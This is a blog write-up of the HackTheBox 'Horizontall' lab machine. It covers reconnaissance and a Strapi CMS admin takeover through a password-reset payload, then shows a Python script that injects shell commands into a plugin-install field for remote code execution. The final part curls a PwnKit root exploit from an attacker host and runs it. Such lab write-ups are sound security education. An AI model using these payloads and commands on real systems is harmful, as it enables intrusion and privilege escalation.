[{"content":"Intro Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first \u0026lsquo;real\u0026rsquo; challenge. Although it is rated \u0026lsquo;Easy\u0026rsquo;, I had to apply all of my current knowledge to snag both flags. Let\u0026rsquo;s crack straight into it!\nReconnaissance Machine tags:\n Linux CMS Exploit Outdated Software CVE Injection RCE Account Misconfiguration  The tags on the machine alone gives us a pretty good idea of what we\u0026rsquo;ll be up against.\nScanning \u0026amp; Discovery nmap Let\u0026rsquo;s start with a simple nmap scan:\n# Nmap 7.92 scan initiated Fri Feb 4 15:37:34 2022 as: nmap -sC -sV -O -oA initial_scripts_versions_os 10.10.11.105 Nmap scan report for 10.10.11.105 Host is up (0.046s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb |_http-server-header: nginx/1.14.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/4%OT=22%CT=1%CU=31967%PV=Y%DS=2%DC=I%G=Y%TM=61FD2C35 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Takeaway:\n nginx web server running on :80 OpenSSH 7.6p1 SSH server on :22 Ubuntu OS  _http-title: Did not follow redirect to http://horizontall.htb\nWe can see a redirect to a URL. Let\u0026rsquo;s add it to our /etc/hosts file:\nsudo echo \u0026quot;10.10.11.105 horizontall.htb\u0026quot; \u0026gt;\u0026gt; /etc/hosts\nI left an all port scan in the background afterwards, but it did not give any additional results.\nwhatweb Whatweb didn\u0026rsquo;t give us any more information than nmap already did.\nhttp://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux] [nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0] horizontall.htb I connected to this URL and was greeted by this:\n Landing page \nScrolling down, I noticed what seemed like a contact form of some sort:\n Contact form \nI did my best attempt at an XSS script, but after writing it I noticed that the \u0026ldquo;Send\u0026rdquo; button has no JS attached to it. So this attack surface, at least, was not likely.\nNext, I decided to try and brute-force some hidden files and directories with gobuster.\ngobuster @ horizontall.htb I did a quick peek with the dirb/big.txt wordlist, but did not find anything of interest:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: conf,php,txt,asp,aspx [+] Timeout: 10s =============================================================== 2022/02/04 16:14:11 Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/css/] /favicon.ico (Status: 200) [Size: 4286] /img (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/img/] /js (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/js/] =============================================================== 2022/02/04 16:28:50 Finished =============================================================== I pondered running a larger wordlist, but decided to check out the SSH service before coming back for a second try.\nSSH Service (rabbit hole) What caught my eye after the nmap scan, was the OpenSSH 7.6p1 version of the SSH service. A quick search on exploit-db.com found multiple possible vulnerabilities. What solidified my belief, was the CVE 2018-15473 exploit named OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration. It seemed as though the box\u0026rsquo;s version was succeptible. After attempting both manually running the scripts on exploit-db.com as well as trying them out automatically via Metasploit, I realized that the server does not leak existing usernames. Rather, it reports all usernames as valid.\nAs such, using a brute-force or dictionary attack via Hydra or something similar was also something I closed the book on.\nAlthough, the machine had the tag \u0026ldquo;CMS\u0026rdquo;, however we only ever saw a landing page. Is there something we missed? Where is this CMS?\nwfuzz subdomains With nowhere else to go, I tried to enumerate possible subdomains. I used the amazing subdomains-top1million-110000.txt wordlist from the SecLists repository that I very much recommend.\nwfuzz -c -f subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#39;http://horizontall.htb\u0026#39; -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; We found one subdomain out of the ~114000 -\u0026gt; api-prod\nLet\u0026rsquo;s quickly add it to our hosts file and check it out!\nsudo echo \u0026quot;10.10.11.105 api-prod.horizontall.htb\u0026quot; \u0026gt;\u0026gt; /etc/hosts\napi-prod.horizontall.htb Upon connecting, I was greeted with a very underwhelming screen:\n api-prod.horizontall.htb \nThe source code did not give any particularly interesting leads, and so, I went for another gobuster run.\ngobuster @ api-prod.horizontall.htb Looking for clues, I started another gobuster run, this time with a much larger wordlist, just in case, directory-list-2.3-big.txt from the aforementioned SecLists repo.\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://api-prod.horizontall.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/04 17:17:09 Starting gobuster in directory enumeration mode =============================================================== /reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854] Very quickly, I found some hidden directories and went to check them out.\napi-prod.horizontall.htb/reviews Even though I was barred from checking out the much more interesting /users endpoint, I wanted to see what /reviews had in store also. Unfortunately, it wasn\u0026rsquo;t anything noteworthy, apart from a few usernames. They seemed more like customers than anything resembling a privileged user on the system, so I disregarded this lead as a red herring.\n Reviews \n/admin seemed like the juiciest bit anyway, so let\u0026rsquo;s go there.\napi-prod.horizontall.htb/admin My hopes were reignited when I saw this login screen.\n Strapi CMS Admin Log-in \nTrying out a few commonly used passwords did not prove fruitful. Neither did the \u0026ldquo;Forgot your password?\u0026rdquo; screen.\n Strapi CMS â€˜Forgot your password?' \nA search on exploit-db.com for strapi CMS returned three possible vulnerabilities - an unauthenticated password reset and two RCEs, one requiring authentication and one not. However, I did not know the version of Strapi used here. I was unsure whether or not the exploits would work.\nBefore trying them out, since this is a log-in screen after all, SQL injection sprung into my mind. I booted up Burp Suite and sqlmap.\nExploitation sqlmap with Burp Suite (rabbit hole) I saved a random login request with Burp for use with sqlmap:\nPOST /admin/auth/local HTTP/1.1 Host: api-prod.horizontall.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api-prod.horizontall.htb/admin/auth/login Content-Type: application/json Origin: http://api-prod.horizontall.htb Content-Length: 44 DNT: 1 Connection: close {\u0026quot;identifier\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;password\u0026quot;} However, sqlmap wasn\u0026rsquo;t successful neither with the identifier, nor the password field.\nWelp, time to try out that password reset and those RCEs.\nSet Password (Unauthenticated) First of all, I tried the password reset exploit (CVE 2019-18818). My reasoning was to try this first, and the RCE exploits after, specifically, the one that requires authentication, I thought it might have a higher chance of success than the one not needing authentication.\nUnfortunately, the exploit\u0026rsquo;s Python script did not work correctly out of the box, I was hit by an error regarding the json package used. Not wanting to mess around with installing a different version of Python or reinstalling different packages, I skimmed through the code and found a point of interest.\nprint(\u0026#34;[*] Password reset for user: {}\u0026#34;.format(userEmail)) resetPasswordReq={\u0026#34;email\u0026#34;:userEmail, \u0026#34;url\u0026#34;:\u0026#34;{}/admin/plugins/users-permissions/auth/reset-password\u0026#34;.format(strapiUrl)} s.post(\u0026#34;{}/\u0026#34;.format(strapiUrl), json=resetPasswordReq) # Set new password print(\u0026#34;[*] Setting new password\u0026#34;) exploit={\u0026#34;code\u0026#34;:{}, \u0026#34;password\u0026#34;:newPassword, \u0026#34;passwordConfirmation\u0026#34;:newPassword} r=s.post(\u0026#34;{}/admin/auth/reset-password\u0026#34;.format(strapiUrl), json=exploit) The code seems to simply send a specially formatted JSON to the aforementioned \u0026lsquo;Forgot your password?\u0026rsquo; URL. Fortunately for me, I had just saved the login request with Burp Suite, when I was messing around with sqlmap. With a quick change of the Host: header and swapping out the login JSON payload for the password reset one, I had my exploit ready to go:\nPOST /admin/auth/reset-password HTTP/1.1 Host: api-prod.horizontall.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api-prod.horizontall.htb/admin/auth/login Content-Type: application/json Origin: http://api-prod.horizontall.htb Content-Length: 146 DNT: 1 Connection: close {\u0026quot;code\u0026quot; : {\u0026quot;$gt\u0026quot;:0}, \u0026quot;password\u0026quot; : \u0026quot;SuperStrongPassword1\u0026quot;, \u0026quot;passwordConfirmation\u0026quot; : \u0026quot;SuperStrongPassword1\u0026quot; } I hit send on Burp Suite and cross my fingers\u0026hellip;\nI\u0026rsquo;m met with a 200 OK reply! Along with an accompanying JWT token, admin username and email address!\nHTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Fri, 04 Feb 2022 17:42:52 GMT Content-Type: application/json; charset=utf-8 Content-Length: 249 Connection: close Vary: Origin Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true Content-Security-Policy: img-src 'self' http:; block-all-mixed-content Strict-Transport-Security: max-age=31536000; includeSubDomains X-Frame-Options: SAMEORIGIN X-XSS-Protection: 1; mode=block X-Powered-By: Strapi \u0026lt;strapi.io\u0026gt; {\u0026quot;jwt\u0026quot;:\u0026quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk2NTcyLCJleHAiOjE2NDY1ODg1NzJ9.38OEmWdTXIBVRZid4mcY6JeZ2pBV4GQi2_SMHGafhec\u0026quot;,\u0026quot;user\u0026quot;:{\u0026quot;id\u0026quot;:3,\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;admin@horizontall.htb\u0026quot;,\u0026quot;blocked\u0026quot;:null}} Let\u0026rsquo;s try that log-in now :3\nAdmin log-in @ api-prod.horizontall.htb/admin Logging in with the SuperStrongPassword1 after the password reset exploit proved successful. I landed in what seemed like an admin dashboard.\n Strapi CMS Admin Dashboard \nWhat instantly caught my eye was the Files Upload tab in the Plugins section. Sure enough, I could upload a file. I went to PayloadsAllTheThings for inspiration, crafted and uploaded myself a PHP reverse shell payload.\n Reverse shell upload \nUnfortunately, I did not have much success with uploaded files getting to run. Without dwelling too much on it, I decided to try out the RCE exploits I found before. The Strapi version didn\u0026rsquo;t seem that different from the password reset exploit, so I had fairly high hopes.\nRemote Code Execution (RCE) (Authenticated) \u0026amp; User Flag While working with the RCE exploit I also again encountered some Python weirdness. Mostly regarding the JWT token. I was used to it at this point, so I just duct-taped bits and pieces of both RCE exploits, as they seemed to target the same /admin/plugins/install path, hard-coded in the JWT and target URL. At the end, it looked like this:\nimport requests from cmd import Cmd class Terminal(Cmd): prompt = \u0026#34;$\u0026gt; \u0026#34; def default(self, args): code_exec(args) def code_exec(cmd): global jwt, url jwt = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk4MTkwLCJleHAiOjE2NDY1OTAxOTB9.fw_8CAfFHcZbgprQaa9LTA771Vz0UI6WyvgvynMKYyI\u0026#34; url = \u0026#34;http://api-prod.horizontall.htb\u0026#34; headers = {\u0026#34;Authorization\u0026#34; : f\u0026#34;Bearer {jwt}\u0026#34;} data = {\u0026#34;plugin\u0026#34; : f\u0026#34;documentation \u0026amp;\u0026amp; $({cmd})\u0026#34;, \u0026#34;port\u0026#34; : \u0026#34;1337\u0026#34;} out = requests.post(f\u0026#34;{url}/admin/plugins/install\u0026#34;, json = data, headers = headers) print(out.text) if __name__ == (\u0026#34;__main__\u0026#34;): terminal = Terminal() terminal.cmdloop() While the exploit did seem to do something, it would always respond with a \u0026ldquo;Bad Request\u0026rdquo; HTTP reply, instead of the output of id or whatever else I tried to execute. I then tried to give myself a proper reverse shell. I used RevShells to help me out crafting the command itself.\n User Access \nAnd I got myself a shell! I checked out /home and grabbed the user flag :)\n User Flag \nIt was now time to try and get root access.\nPrivilege Escalation SUDO and SUID enumeration One of the ways to privesc to root, that require very little effort, is finding easily exploitable binaries that we can either run as SUDO or that have their SUID bit set on.\nLet\u0026rsquo;s look for SUDO access first.\nsudo -l I was requested a password, so this avenue won\u0026rsquo;t work.\nNext, I tried to look for easily exploitable binaries with SUID bits.\nfind / -perm -u=s -type f 2\u0026gt;/dev/null I tried cross-referencing the output with the SUID list over at GTFOBins, but did not find anything out of the ordinary.\nLinux Exploit Suggester On my host machine, I made myself an SSH key and pasted the public key over into .ssh/authorized_keys on the strapi account. I could now log-in via SSH normally and not rely on the fragile reverse shell anymore.\nNext, I curl\u0026rsquo;d myself the Linux Exploit Suggester onto the remote machine and let it do its thing.\nstrapi@horizontall:~$ ./les.sh Available information: Kernel version: 4.15.0 Architecture: x86_64 Distribution: ubuntu Distribution version: 18.04 Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed Package listing: from current OS Searching among: 78 kernel space exploits 49 user space exploits Possible Exploits: [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main Seeing the PwnKit exploit pop-up made me smile. I was listening to SANS Internet Stormcenter Podcast a few days ago and heard about a new pollkit exploit (\u0026quot;PwnKit\u0026quot; CVE-2021-4034) floating around, making pretty much every single Linux machine vulnerable since 2009. This makes a lot of the CTF machines vulnerable to something other than what was likely intended by its designer. I pondered on looking for the \u0026lsquo;intended\u0026rsquo; exploit, but I had spent a considerable amount of time just getting to this point, I knew that getting root access otherwise would take me equally as long if the journey there was as involved as getting the initial foothold. I decided that an exploit is an exploit and just went with the PwnKit route.\nPwnKit \u0026amp; System Flag Applying the exploit was trivial. LES had even given me a download link. And just like with LES, I curl\u0026rsquo;d myself the exploit onto the remote machine and ran it. The exploit zoomed by extremely quickly, and I was now root. I went and snatched the system flag. And that\u0026rsquo;s it for Horizontall.\nstrapi@horizontall:~$ curl 10.10.14.130:8080/pwnkit -o pwnkit % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14688 100 14688 0 0 103k 0 --:--:-- --:--:-- --:--:-- 103k strapi@horizontall:~$ chmod +x pwnkit strapi@horizontall:~$ ./pwnkit root@horizontall:/opt/strapi# id uid=0(root) gid=0(root) groups=0(root),1001(strapi) root@horizontall:/opt/strapi# whoami root root@horizontall:/opt/strapi# cd ~ root@horizontall:~# ls boot.sh pid restart.sh root.txt root@horizontall:~# cat root.txt ed9440c3385bdec9f943c2cc3c0af71e root@horizontall:~# NOTE: If you would like to read the \u0026lsquo;intended\u0026rsquo; or \u0026lsquo;proper\u0026rsquo; way of the gaining root access, involving a Laravel Debug Mode RCE, I strongly recommend 0xdf\u0026rsquo;s writeup of Horizontall.\nOutro And that\u0026rsquo;s that. In the future, I will probably go through HackTheBox\u0026rsquo;s \u0026lsquo;Starting Point\u0026rsquo; set of machines. I planned on doing so from the start, but I wanted to try my hand at one of the \u0026lsquo;Easy\u0026rsquo; boxes rather than going for the \u0026lsquo;Very Easy\u0026rsquo; ones, to give myself a sort of reality check and to better gauge how much knowledge and understanding I have right now.\nWhilst doing this box, not counting the PwnKit exploit, I feel like I went the hard way about it. There were faster, less conspicuous and smarter way to achieve the same result. The api-prod subdomain was hidden in one of the minified .js files of the landing page, for example, thus avoiding the lengthy brute-forcing of subdomains.\nI was pretty easily led astray by various red herrings, like the file upload plugin on the admin dashboard or after seeing the version of the SSH service. However, I\u0026rsquo;m still a beginner, so I believe noticing these things sooner requires time and experience.\nAll in all, I feel like I have many areas to improve in, but at the same time, I\u0026rsquo;m glad I didn\u0026rsquo;t got completely stumped by one of the slightly more challenging boxes. :)\n","date":"2022-02-05T20:55:12+02:00","image":"https://weaponizedpeach.github.io/p/hackthebox-horizontall/cover_hu288a9f216fac044683ba08b675347c45_114732_120x120_fill_box_smart1_3.png","permalink":"https://weaponizedpeach.github.io/p/hackthebox-horizontall/","title":"HackTheBox: Horizontall"}]